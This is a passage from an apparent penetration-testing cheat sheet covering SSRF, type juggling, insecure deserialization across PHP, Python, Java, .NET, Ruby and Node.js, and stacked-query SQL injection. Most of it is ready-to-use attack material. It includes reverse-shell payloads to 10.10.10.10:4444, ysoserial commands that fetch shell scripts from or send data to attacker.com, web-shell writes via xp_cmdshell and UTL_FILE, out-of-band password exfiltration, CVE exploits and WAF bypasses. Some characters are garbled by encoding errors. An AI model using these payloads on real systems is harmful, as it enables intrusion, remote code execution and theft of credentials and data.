# Unicode tricks
http://127.0.0.1  # Using fullwidth characters
```

### Protocol Confusion

```bash
# Try multiple protocols
dict://127.0.0.1:6379/info
ldap://127.0.0.1:389/
tftp://127.0.0.1:69/file.txt
jar://http://127.0.0.1!/resource

# PHP wrappers (if PHP backend)
php://filter/convert.base64-encode/resource=/etc/passwd
php://input  # With POST data
data://text/plain,<?php system($_GET['cmd']); ?>
expect://id
```

### SSRF Chain Exploitation

**Combining SSRF with other vulnerabilities:**

```bash
# SSRF -> XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/secret">]>
<data>&xxe;</data>

# SSRF -> Open Redirect
http://target.com/redirect?url=http://internal-service
# Then use SSRF to access the redirect

# SSRF -> File Upload
# Upload file to internal service via SSRF POST request
```

## Automated Tools

**SSRFmap:**

```bash
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Basic usage
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Port scan
python3 ssrfmap.py -r request.txt -p url -m portscan

# AWS metadata
python3 ssrfmap.py -r request.txt -p url -m aws
```

**ffuf for SSRF fuzzing:**

```bash
# Fuzz internal ports
ffuf -u "http://target.com/fetch?url=http://127.0.0.1:FUZZ" -w ports.txt

# Fuzz internal IPs
ffuf -u "http://target.com/fetch?url=http://FUZZ.FUZZ.FUZZ.FUZZ/" \
     -w <(seq 0 255) -w <(seq 0 255) -w <(seq 0 255) -w <(seq 0 255)

# Fuzz protocols
ffuf -u "http://target.com/fetch?url=FUZZ://127.0.0.1/" -w protocols.txt
```

## Important Considerations

**Defense detection:** Many SSRF protections validate URLs before making requests. Test multiple encoding methods and edge cases in URL parsers.

**Time limits:** Internal network requests may timeout differently than external requests, useful for blind detection.

**Response differences:** Internal services often return different HTTP status codes, headers, or response times compared to external services.


---

# Insecure Deserialization & Type Confusion

## Type Juggling

Type juggling exploits occur when programming languages perform automatic type conversion during comparisons or operations, leading to unexpected behavior that bypasses security controls.

### PHP Type Juggling

**Loose Comparison Vulnerabilities**

PHP's `==` operator performs type coercion, while `===` performs strict comparison.

```php
// Vulnerable comparisons
"0e123" == "0e456"  // true (both treated as scientific notation = 0)
"0" == "admin"      // false
0 == "admin"        // true (string cast to 0)
true == "anything"  // true
"240" == 240        // true
```

**Magic Hashes**

Strings starting with "0e" followed by digits are interpreted as scientific notation (0 Ã— 10^n = 0):

```
0e215962017 == 0e291242476 // both equal 0
```

Common magic hash values for MD5:

- `240610868` â†’ `0e462097431906509019562988736854`
- `QNKCDZO` â†’ `0e830400451993494058024219903391`
- `aabg7XSs` â†’ `0e087386482136013740957780965295`

For SHA1:

- `aaroZmOk` â†’ `0e66507019969427134894567494305185566735`
- `aaK1STfY` â†’ `0e76658526655756207688271159624026011393`

**Exploitation Example**

```php
// Vulnerable login check
if (md5($password) == "0e123456789") {
    // Login successful
}

// Bypass with: 240610868
// md5("240610868") = "0e462097431906509019562988736854"
```

**JSON Numeric Coercion**

```php
$data = json_decode('{"admin": 1}', true);
if ($data['admin'] == true) // Vulnerable
```

**Boolean Juggling**

```php
// Always true conditions
if ("string" == true)
if (hash("md5", $input) == true) // Any non-empty string
```

**Array Comparison Bypass**

```php
// Vulnerable password check
if ($_POST['password'] == $stored_hash) {
    // Login
}

// Bypass: POST password[]=anything
// Array compared to string always false, but may bypass empty checks
```

### Python Type Confusion

**Implicit Conversions**

```python
# Boolean context
if "": # False
if "0": # True (non-empty string)
if []: # False
if [0]: # True (non-empty list)

# Numeric comparison
1 == True  # True
0 == False # True
```

**YAML Deserialization Type Confusion**

```python
import yaml

# Input: "admin: yes"
data = yaml.load(input)  # Unsafe
# 'yes' becomes boolean True

# Input: "port: 0x50"
# '0x50' becomes integer 80
```

### JavaScript Type Coercion

**Equality Operators**

```javascript
// Loose equality (==) vulnerabilities
"0" == 0        // true
"" == 0         // true
null == undefined // true
[] == ![]       // true (bizarre)

// Use === for strict comparison
"0" === 0       // false
```

**Array to String Coercion**

```javascript
[1,2,3] == "1,2,3"  // true
[] == ""            // true
[5] == 5            // true
```

**NaN Comparison**

```javascript
NaN == NaN  // false
NaN === NaN // false

// Detection bypass
function isNaN(x) { return x !== x; }
```

## Weak Type Comparison

### Common Vulnerable Patterns

**Authentication Bypass**

```php
// Vulnerable token validation
if (hash('sha256', $user_token) == $valid_token) {
    // Authenticated
}

// Attack: Provide array as token
// hash() returns NULL for array input
// NULL == "string" may evaluate true in certain contexts
```

**SQL Injection via Type Confusion**

```php
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";

// No quotes around $id - expects integer
// Attack: ?id=1 OR 1=1
// Type juggling allows string injection
```

**In Operator Bypass**

```php
if (in_array($_GET['role'], ['user', 'guest'])) {
    // Allowed
}

// Attack: ?role=0
// in_array with loose comparison: 0 == "user" (false), but 0 == 0 (true if exists)
```

### Testing Methodology

**Fuzzing Type Combinations**

```bash
# Test different type inputs
curl 'https://target.com/api' -d '{"admin":"true"}'    # String
curl 'https://target.com/api' -d '{"admin":true}'      # Boolean
curl 'https://target.com/api' -d '{"admin":1}'         # Integer
curl 'https://target.com/api' -d '{"admin":"1"}'       # Numeric string
curl 'https://target.com/api' -d '{"admin":["admin"]}' # Array
```

**Parameter Pollution**

```bash
# Multiple values with different types
curl 'https://target.com/check?role=user&role=admin'
curl 'https://target.com/check?role[]=user&role=admin'
```

## Serialized Object Manipulation

### PHP Serialization

**Serialization Format**

```php
// Object structure
class User {
    public $name = "admin";
    private $role = "user";
    protected $token = "abc123";
}

$obj = new User();
echo serialize($obj);

// Output:
// O:4:"User":3:{s:4:"name";s:5:"admin";s:11:"Userrole";s:4:"user";s:8:"*token";s:6:"abc123";}

// Format breakdown:
// O:4:"User"              - Object with 4-char class name "User"
// :3:{}                  - 3 properties
// s:4:"name"             - String key, 4 chars
// s:5:"admin"            - String value, 5 chars
// s:11:"Userrole"       - Private property (prepended with class name)
// s:8:"*token"          - Protected property (prepended with *)
```

**Magic Methods Exploitation**

Critical magic methods for exploitation:

```php
__wakeup()      // Called on unserialize()
__destruct()    // Called when object destroyed
__toString()    // Called when object treated as string
__call()        // Called when invoking inaccessible methods
__get()         // Called when accessing inaccessible properties
__set()         // Called when writing to inaccessible properties
__isset()       // Called when isset() used on inaccessible properties
__unset()       // Called when unset() used on inaccessible properties
```

**Property-Oriented Programming (POP) Chains**

```php
// Vulnerable class chain
class FileHandler {
    private $filename;
    
    public function __destruct() {
        unlink($this->filename); // Delete file on destroy
    }
}

class Logger {
    private $handler;
    
    public function __toString() {
        return $this->handler->getLog();
    }
}

// Exploit: Chain objects to delete arbitrary files
$exploit = new FileHandler();
$exploit->filename = "/var/www/html/.htaccess";

$serialized = serialize($exploit);
// Modify to: O:11:"FileHandler":1:{s:19:"FileHandlerfilename";s:27:"/var/www/html/.htaccess";}
```

**Object Injection Techniques**

```php
// Modify object properties
$original = 'O:4:"User":1:{s:4:"role";s:4:"user";}';
$modified = 'O:4:"User":1:{s:4:"role";s:5:"admin";}';

// Inject new properties
$exploit = 'O:4:"User":2:{s:4:"role";s:5:"admin";s:8:"is_admin";b:1;}';

// Reference manipulation
$ref = 'O:4:"User":1:{s:4:"data";a:2:{i:0;s:4:"test";i:1;R:2;}}';
// R:2 creates reference to element 0
```

**Phar Deserialization**

```php
// Vulnerable file operations trigger deserialization
file_exists('phar://exploit.phar/test.txt');
file_get_contents('phar://malicious.phar/file');
fopen('phar://shell.phar/a', 'r');

// Create malicious phar
class Exploit {
    public function __destruct() {
        eval($this->cmd);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$obj = new Exploit();
$obj->cmd = 'system($_GET["cmd"]);';
$phar->setMetadata($obj);

$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
```

**Tool: PHPGGC (PHP Generic Gadget Chains)**

```bash
# Installation
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# List available gadget chains
./phpggc -l

# Generate payload for Laravel RCE
./phpggc Laravel/RCE1 system id

# Generate payload with specific encoding
./phpggc -b Laravel/RCE1 system "cat /etc/passwd"
# -b: base64 encode
# -u: URL encode
# -s: soft URL encode

# Generate payload for file write
./phpggc Symfony/RCE4 /var/www/html/shell.php '<?php system($_GET["c"]); ?>'

# Chain with wrapper
./phpggc Laravel/RCE1 system id | base64 -w0
```

### Python Pickle Deserialization

**Pickle Format & Exploitation**

```python
import pickle
import os

# Vulnerable deserialization
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# Send payload to vulnerable endpoint

# Alternative RCE payload
payload = b'''c__builtin__
eval
(S'__import__("os").system("bash -c \'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\'")'
tR.'''
```

**Pickle Opcode Manipulation**

```python
import pickletools

# Analyze pickle structure
pickletools.dis(payload)

# Manual pickle construction for RCE
payload = b"""cos
system
(S'id'
tR."""

# Alternative using eval
payload = b"""c__builtin__
__import__
(S'os'
tRp0
0g0
(S'system'
tRp1
0g1
(S'whoami'
tR."""
```

**Tool: Pickle Payload Generator**

```python
#!/usr/bin/env python3
import pickle
import base64
import sys

class RCE:
    def __reduce__(self):
        import os
        return (os.system, (sys.argv[1],))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
```

### Java Serialization

**Serialization Format**

```
AC ED 00 05  // Magic bytes for Java serialization
```

**Tool: ysoserial**

```bash
# Installation
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# List available payloads
java -jar ysoserial-all.jar

# Generate CommonsCollections payload
java -jar ysoserial-all.jar CommonsCollections6 'wget http://attacker.com/shell.sh -O /tmp/s.sh' > payload.bin

# Common gadget chains
java -jar ysoserial-all.jar CommonsCollections1 'calc.exe'
java -jar ysoserial-all.jar CommonsCollections5 'curl http://attacker.com/?data=$(whoami)'
java -jar ysoserial-all.jar Spring1 'touch /tmp/pwned'
java -jar ysoserial-all.jar Jdk7u21 'nc -e /bin/bash 10.10.10.10 4444'

# Base64 encode for web transport
java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 -w0

# Generate URLDNS payload for detection
java -jar ysoserial-all.jar URLDNS 'http://burp-collaborator.com'
```

**Detection & Enumeration**

```bash
# Check for Java serialization in HTTP traffic
grep -r "ac ed 00 05" *.pcap

# Burp Suite: Java Deserialization Scanner extension
# Look for Content-Type: application/x-java-serialized-object

# Test with URLDNS (no RCE, just detection)
java -jar ysoserial-all.jar URLDNS http://your-burp-collaborator.com | base64
```

### .NET Deserialization

**Tool: ysoserial.net**

```powershell
# Download from: https://github.com/pwntester/ysoserial.net

# Generate payload
.\ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "calc.exe"

# Common formatters
.\ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c "powershell -enc <base64>"
.\ysoserial.exe -g WindowsIdentity -f SoapFormatter -c "cmd /c whoami"

# LosFormatter (ViewState)
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo pwned > C:\temp\proof.txt" --path="/page.aspx" --apppath="/" --decryptionalg="AES" --validationalg="SHA1"

# With validation key
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup attacker.com" --validationkey="<key>" --validationalg="SHA1"
```

### Ruby Marshal

**Exploitation**

```ruby
# Vulnerable deserialization
user_data = Marshal.load(params[:data])

# RCE payload
payload = Marshal.dump(eval('`id`'))

# Gadget chain using ERB
require 'erb'
erb = ERB.allocate
erb.instance_variable_set(:@src, "`id`")
payload = Marshal.dump(erb)
```

### Node.js node-serialize

**RCE via IIFE (Immediately Invoked Function Expression)**

```javascript
// Vulnerable code
const serialize = require('node-serialize');
const obj = serialize.unserialize(cookie);

// Exploit payload
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\"', function(error, stdout, stderr) { console.log(stdout) });}()"}

// Alternative with eval
{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10));}()"}
```

**Exploit Script**

```python
#!/usr/bin/env python3
import requests
import base64

payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'nc -e /bin/sh 10.10.10.10 4444\', function(error, stdout, stderr) { console.log(stdout) });}()"}'

cookie = base64.b64encode(payload.encode()).decode()
requests.get('http://target.com/', cookies={'profile': cookie})
```

## Remote Code Execution via Deserialization

### Attack Workflow

**1. Identify Deserialization**

```bash
# HTTP traffic patterns
Content-Type: application/x-java-serialized-object
Content-Type: application/x-php-serialized

# Magic bytes
AC ED 00 05        # Java
4F:XX:"ClassName"  # PHP serialized object
80 02 ...          # Python pickle (protocol 2)

# Base64 encoded indicators
rO0AB           # Java (starts with aced0005)
Tzo=            # PHP (starts with O:)
gAN             # Python pickle
```

**2. Fingerprint Technology Stack**

```bash
# Wappalyzer
wappalyzer https://target.com

# whatweb
whatweb -v https://target.com

# Check cookies for framework indicators
# JSESSIONID = Java
# PHPSESSID = PHP
# ASP.NET_SessionId = .NET
```

**3. Generate Exploit Payload**

```bash
# Java
java -jar ysoserial-all.jar [gadget] [command]

# PHP
phpggc [gadget-chain] [args]

# Python
python3 pickle_exploit.py

# .NET
ysoserial.exe -g [gadget] -f [formatter] -c [command]
```

**4. Encode & Deliver**

```bash
# Base64 encoding
cat payload.bin | base64 -w0 > payload.b64

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote(open('payload.bin','rb').read()))"

# Gzip compression (for size limits)
cat payload.bin | gzip | base64 -w0
```

**5. Trigger Deserialization**

```bash
# Cookie injection
curl -b "session=<payload>" https://target.com

# POST parameter
curl -X POST -d "data=<payload>" https://target.com/endpoint

# File upload with polyglot
# Embed serialized payload in valid file format
```

### Real-World Exploitation Examples

**Jenkins Deserialization (CVE-2015-8103)**

```bash
# Exploit using ysoserial
java -jar ysoserial-all.jar CommonsCollections1 'curl http://attacker.com/shell.sh|bash' > payload.bin

# Send to Jenkins CLI
java -jar jenkins-cli.jar -s http://target:8080 help @payload.bin
```

**Apache Struts (CVE-2017-9805)**

```bash
# REST plugin vulnerable to XStream deserialization
curl -X POST http://target/struts2-rest-showcase/orders/3 \
  -H "Content-Type: application/xml" \
  -d '<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <filter class="javax.imageio.ImageIO$ContainsFilter">
                      <method>
                        <class>java.lang.ProcessBuilder</class>
                        <name>start</name>
                        <parameter-types/>
                      </method>
                      <name>calc</name>
                    </filter>
                  </iter>
                </serviceIterator>
              </cipher>
            </is>
          </dataSource>
        </dataHandler>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
  </entry>
</map>'
```

**Spring Framework (CVE-2016-4977)**

```bash
# Generate payload
java -jar ysoserial-all.jar Spring1 'touch /tmp/pwned' > payload.bin

# Exploit Spring Remoting
curl -X POST http://target:8080/spring-remoting \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

### Polyglot Payloads

**PHAR+JPEG Polyglot**

```php
<?php
class Exploit {
    public $cmd = 'system';
    public $arg = 'id';
    
    public function __destruct() {
        ($this->cmd)($this->arg);
    }
}

$jpeg = file_get_contents('legitimate.jpg');
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub($jpeg . ' __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

rename('exploit.phar', 'exploit.jpg');
?>

<!-- Upload as image, then trigger via: -->
<!-- file_exists('phar://uploads/exploit.jpg/test.txt') -->
```

**Serialized PHP in Image EXIF**

```bash
# Embed PHP serialized object in EXIF comment
exiftool -Comment='O:7:"Exploit":1:{s:3:"cmd";s:10:"phpinfo();";}' shell.jpg

# If app processes EXIF and unserializes
```

## Bypass Protection Mechanisms

### Signature Validation Bypass

**Magic Method Manipulation**

```php
// If __wakeup() validates signature
class User {
    public $data;
    public $signature;
    
    public function __wakeup() {
        if (hash('sha256', $this->data) !== $this->signature) {
            throw new Exception('Invalid signature');
        }
    }
}

// Bypass: CVE-2016-7124 - Incorrect object count
// O:4:"User":2:{...}  // Normal: 2 properties
// O:4:"User":3:{...}  // Modified: claim 3 properties (has only 2)
// __wakeup() is not called when object count mismatches

$serialized = 'O:4:"User":3:{s:4:"data";s:4:"test";s:9:"signature";s:64:"..."}';
```

**Property Count Mismatch**

```php
// Original
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}

// Bypass __wakeup by increasing count
O:4:"User":3:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

### Class Existence Checks

**Dynamic Class Instantiation**

```php
// Protection: Check if class exists
if (!class_exists($className)) {
    die('Invalid class');
}

// Bypass: Use built-in PHP classes
O:9:"Exception":1:{s:17:"Exceptionmessage";s:6:"pwned";}
O:12:"SplFileObject":1:{s:0:"";s:18:"/etc/passwd";}

// Autoload exploitation
O:10:"PDOStatement":0:{}  // May trigger autoloader
```

**Namespace Confusion**

```php
// Bypass class restrictions with namespaces
// Blocked: User
// Allowed: \Vendor\Package\User

O:21:"\Vendor\Package\User":1:{...}
```

### Type Enforcement Bypass

**Null Byte Injection**

```php
// Serialized private property format
s:11:"Userprop";  // Normal: Class\0property

// Inject null byte in different encoding
s:10:"User%00prop";  // May bypass filters checking "User"
```

**Unicode Normalization**

```php
// Filter checks for class name "User"
// Bypass with Unicode lookalikes
O:4:"Õser":1:{...}  // Armenian capital U+054D
O:4:"UsÐµr":1:{...}  // Cyrillic e (U+0435)
```

### Input Validation Bypass

**Filter Evasion Techniques**

```php
// Blacklist bypass examples

// Blocked: eval, system, exec
// Bypass: string concatenation
'ev'.'al'
${'sy'.'stem'}('id')

// Bypass: variable functions
$a='sy'.'stem';$a('id');

// Bypass: call_user_func
call_user_func('system','id');

// Blocked: __destruct
// Bypass: __toString, __call, __get

// Blocked: system commands
// Bypass: backticks
`whoami`

// Bypass: popen
$h=popen('id','r');echo(fread($h,1024));
```

**Serialization Filter Bypass**

```php
// If filter removes certain strings
$payload = str_replace('_PLACEHOLDER_', 'system', $template);

// Double encoding
urlencode(urlencode('system'))

// Case sensitivity exploitation
SyStEm (if filter is case-sensitive but PHP is not)
```

### Web Application Firewall (WAF) Bypass

**Chunked Encoding**

```bash
# Split payload across chunks
printf "POST /endpoint HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nO:4:\"U\r\n3\r\nser\r\n0\r\n\r\n" | nc target.com 80
```

**Case Variation**

```php
// Mixed case to evade pattern matching
O:4:"UsEr":1:{s:4:"RoLe";s:5:"AdMiN";}
```

**Encoding Variations**

```bash
# Unicode escape sequences
O:4:"\u0055ser":1:{...}

# Hex encoding in JSON
{"class":"\x55ser","data":"..."}

# Base64 layers
echo "payload" | base64 | base64
```

### Advanced Bypass Techniques

**Property Hiding**

```php
// Use non-printable characters
class User {
    public $role = "user";
    public $admin = false;
}

// Inject hidden property
O:4:"User":3:{s:4:"role";s:5:"admin";s:5:"admin";b:1;s:1:" ";s:0:"";}
//                                                        ^ Hidden property
```

**Reference Manipulation**

```php
// Create circular references to confuse parsers
O:4:"User":2:{s:4:"data";a:1:{i:0;r:1;}s:4:"next";r:1;}
// r:1 references the User object itself
```

**Integer Overflow**

```php
// Exploit size field parsing
O:4:"User":2147483648:{...}  // May cause integer overflow in parser
```

**Compression Bombs**

```php
// If app decompresses before validating
$payload = gzcompress(str_repeat("A", 10000000));
// Small compressed size, huge decompressed
```

## Key Tools Summary

```bash
# PHP
phpggc                    # PHP gadget chain generator
phpcs                     # Code sniffer (find unserialize calls)

# Java
ysoserial                 # Java deserialization exploitation
java-deserialization-scanner  # Burp extension

# Python
pickletools              # Analyze pickle opcodes
fickling                 # Pickle decompiler/analyzer

# .NET
ysoserial.net            # .NET deserialization payloads

# Multi-language
Burp Suite extensions:
- Java Deserialization Scanner
- .NET Beautifier  
- Freddy (Active/Passive deserialization scanner)

# Analysis
wireshark                # Capture and analyze serialized traffic
binwalk                  # Identify embedded serialized objects
```

## Mitigation Detection (For Defenders)

Recognizing these protections helps identify bypass opportunities:

- Allowlists vs blocklists (focus on blocklist bypass)
- Signature validation (focus on __wakeup bypass)
- Class name restrictions (focus on namespace/builtin classes)
- Input validation (focus on encoding/filter evasion)
- Secure deserialization libraries (assess version/configuration)

---

# Advanced SQL Injection

## Stacked Queries and Multi-Query Execution

### Concept and Requirements

Stacked queries allow executing multiple SQL statements in a single injection point by separating them with semicolons. **[Inference]** This technique typically requires specific database configurations and API supportâ€”most commonly successful against MSSQL, PostgreSQL, and Oracle when using certain database connectors.

**MySQL Limitation:** MySQL's `mysqli` and PDO drivers **do not support** stacked queries through `mysql_query()` or standard prepared statements in web contexts. However, `mysqli_multi_query()` explicitly enables this.

### Detection Method

```bash
# Basic stacked query test payload
'; WAITFOR DELAY '0:0:5'--
'; SELECT pg_sleep(5)--
'; SELECT SLEEP(5)--

# Conditional execution test
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

**sqlmap Detection:**

```bash
sqlmap -u "http://target.com/page?id=1" --technique=S --level=5 --risk=3
# --technique=S explicitly tests for stacked queries
```

### Database-Specific Stacked Query Exploitation

#### MSSQL (Microsoft SQL Server)

**Enable xp_cmdshell for OS Command Execution:**

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
```

**File Operations:**

```sql
-- Write web shell
'; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';--

-- Read file
'; CREATE TABLE temp(data varchar(8000)); BULK INSERT temp FROM 'C:\windows\win.ini';--
```

**Out-of-Band Data Exfiltration:**

```sql
'; DECLARE @data varchar(1024); SELECT @data = (SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"');--
```

#### PostgreSQL

**Command Execution via COPY:**

```sql
'; COPY (SELECT '') TO PROGRAM 'whoami';--
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);--
'; COPY cmd_exec FROM PROGRAM 'id';--
'; SELECT * FROM cmd_exec;--
```

**Large Object Exploitation (File Write):**

```sql
'; SELECT lo_import('/etc/passwd', 12345);--
'; SELECT lo_export(12345, '/tmp/passwd');--
```

**PostgreSQL-Specific Functions:**

```sql
'; SELECT version();--
'; SELECT current_setting('data_directory');--
'; SELECT pg_ls_dir('/etc');--
'; SELECT pg_read_file('/etc/passwd', 0, 1000);--
```

#### Oracle

**Command Execution via Java Stored Procedures:**

```sql
'; BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE JAVA SOURCE NAMED "Command" AS public class Command { public static void exec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); }}'; END;--

'; BEGIN EXECUTE IMMEDIATE 'CREATE OR REPLACE PROCEDURE run_cmd(p_cmd VARCHAR2) AS LANGUAGE JAVA NAME ''Command.exec(java.lang.String)'''; END;--

'; BEGIN run_cmd('whoami'); END;--
```

**File Operations:**

```sql
-- UTL_FILE package
'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f := UTL_FILE.FOPEN('DIRECTORY_NAME', 'shell.php', 'W'); UTL_FILE.PUT_LINE(f, '<?php system($_GET["cmd"]); ?>'); UTL_FILE.FCLOSE(f); END;--
```

---

## SQL Operators and Functions for Data Extraction

### String Manipulation for Blind Extraction

#### SUBSTRING/SUBSTR Techniques

**MySQL:**

```sql
SUBSTRING(database(), 1, 1) = 'a'
SUBSTR((SELECT password FROM users LIMIT 1), 1, 1) = 'p'
MID(user(), 1, 1) > 'r'
```

**Binary Search Optimization:**

```bash
# Python script for binary search extraction
import requests

def binary_search_char(position):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{position},1)) > {mid}--"
        response = requests.get(f"http://target.com/page?id=1{payload}")
        if "True_condition_indicator" in response.text:
            low = mid + 1
        else:
            high = mid - 1
    return chr(high + 1)
```

**PostgreSQL:**

```sql
SUBSTRING(version(), 1, 1) = 'P'
SUBSTRING(current_database()::text FROM 1 FOR 1) = 'd'
```

**MSSQL:**

```sql
SUBSTRING(@@version, 1, 1) = 'M'
SUBSTRING((SELECT TOP 1 name FROM sys.databases), 1, 1) = 'm'
```

**Oracle:**

```sql
SUBSTR(banner, 1, 1) = 'O' FROM v$version WHERE ROWNUM=1
SUBSTR((SELECT username FROM all_users WHERE ROWNUM=1), 1, 1) = 'S'
```

#### Bitwise and Character Comparison

**ASCII/ORD Functions:**

```sql
-- MySQL
ASCII(SUBSTRING(database(), 1, 1)) = 116

-- PostgreSQL
ASCII(SUBSTRING(current_database(), 1, 1)) = 112

-- MSSQL
ASCII(SUBSTRING(DB_NAME(), 1, 1)) = 109

-- Oracle
ASCII(SUBSTR(user, 1, 1)) = 83
```

**Case Conversion:**

```sql
UPPER(SUBSTRING(password, 1, 1)) = 'A'
LOWER(SUBSTRING(username, 1, 1)) BETWEEN 'a' AND 'm'
```

### Data Aggregation and Concatenation

#### MySQL Concatenation

```sql
-- GROUP_CONCAT for multiple rows
' UNION SELECT 1, GROUP_CONCAT(schema_name SEPARATOR 0x3a) FROM information_schema.schemata--

-- CONCAT for columns
' UNION SELECT 1, CONCAT(username, 0x3a, password) FROM users--

-- Alternative: CONCAT_WS
' UNION SELECT CONCAT_WS(0x3a, table_name, column_name) FROM information_schema.columns--
```

**Hex Encoding for Special Characters:**

```sql
CONCAT(username, 0x3a3a, password)  -- :: separator
CONCAT_WS(0x7c, col1, col2, col3)    -- | separator
```

#### PostgreSQL String Aggregation

```sql
-- STRING_AGG (PostgreSQL 9.0+)
' UNION SELECT 1, STRING_AGG(tablename, ',') FROM pg_tables WHERE schemaname='public'--

-- Array aggregation alternative
' UNION SELECT 1, ARRAY_TO_STRING(ARRAY_AGG(username), ',') FROM users--

-- Concatenation operator
' UNION SELECT username || ':' || password FROM users--
```

#### MSSQL Concatenation

```sql
-- FOR XML PATH technique (multiple rows)
' UNION SELECT 1, STUFF((SELECT ',' + name FROM sys.tables FOR XML PATH('')), 1, 1, '')--

-- Simple concatenation
' UNION SELECT username + ':' + password FROM users--

-- CONCAT function (SQL Server 2012+)
' UNION SELECT CONCAT(username, ':', password) FROM users--
```

#### Oracle Concatenation

```sql
-- LISTAGG (Oracle 11g Release 2+)
' UNION SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM all_tables WHERE owner='PUBLIC'--

-- Double pipe operator
' UNION SELECT username || ':' || password FROM users WHERE ROWNUM <= 10--

-- CONCAT function (limited to 2 arguments)
' UNION SELECT CONCAT(username, password) FROM users WHERE ROWNUM=1--
```

### Conditional Logic for Boolean-Based Extraction

#### CASE Statements

**MySQL:**

```sql
' AND (CASE WHEN (SUBSTRING(database(),1,1)='t') THEN 1 ELSE 0 END)=1--
' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--
```

**Generic Pattern:**

```sql
' AND (CASE 
    WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') > 0 
    THEN 1 
    ELSE (SELECT 1 FROM non_existent_table) 
END)=1--
```

#### IF/IIF Statements

**MySQL:**

```sql
' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(5), 0)--
' AND IF(ASCII(SUBSTRING(password,1,1))>100, 1, (SELECT 1 FROM non_existent))--
```

**MSSQL:**

```sql
' AND IIF(SUBSTRING(DB_NAME(),1,1)='m', WAITFOR DELAY '0:0:5', 0)--
```

### Time-Based Extraction Functions

**MySQL:**

```sql
SLEEP(5)
BENCHMARK(10000000, SHA1('test'))  -- CPU-intensive alternative
```

**PostgreSQL:**

```sql
PG_SLEEP(5)
-- Heavy query alternative
(SELECT COUNT(*) FROM generate_series(1,1000000))
```

**MSSQL:**

```sql
WAITFOR DELAY '0:0:5'
-- Format: 'hours:minutes:seconds'
```

**Oracle:**

```sql
DBMS_LOCK.SLEEP(5)
-- Requires explicit execution context
BEGIN DBMS_LOCK.SLEEP(5); END;
```

---

## Database-Specific Exploitation Techniques

### MySQL Exploitation

#### Information Extraction Queries

**Database Enumeration:**

```sql
' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata--

-- Version-specific checks
' UNION SELECT @@version, @@version_compile_os--
' UNION SELECT version(), @@hostname--
```

**Table and Column Discovery:**

```sql
-- Tables in current database
' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()--

-- Columns for specific table
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' AND table_schema=database()--

-- All columns with table context
' UNION SELECT CONCAT(table_name, '.', column_name), data_type FROM information_schema.columns WHERE table_schema=database()--
```

**Privilege Enumeration:**

```sql
' UNION SELECT user, host FROM mysql.user--
' UNION SELECT grantee, privilege_type FROM information_schema.user_privileges--
' UNION SELECT user(), current_user(), system_user()--
```

#### File Operations

**Reading Files (Requires FILE privilege):**

```sql
